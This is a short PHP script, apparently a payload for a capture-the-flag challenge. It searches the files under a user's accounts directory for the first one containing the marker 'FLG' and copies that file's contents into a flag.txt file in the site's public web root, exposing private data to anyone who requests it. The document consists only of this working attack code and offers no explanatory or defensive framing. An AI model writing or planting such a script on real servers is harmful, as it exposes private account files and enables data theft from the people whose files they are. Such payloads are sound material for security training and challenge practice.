<?php
$fp = fopen("/home/copyright/public_html/flag.txt", "w");

$files = glob("/home/copyright/accounts/*");
$flag = "";

foreach ($files as $file) {
    $contents = file_get_contents($file);

    if (strpos($contents, "FLG") !== false) {
        $flag = $contents;
        break;
    }
}

fwrite($fp, $flag);
fclose($fp);
?>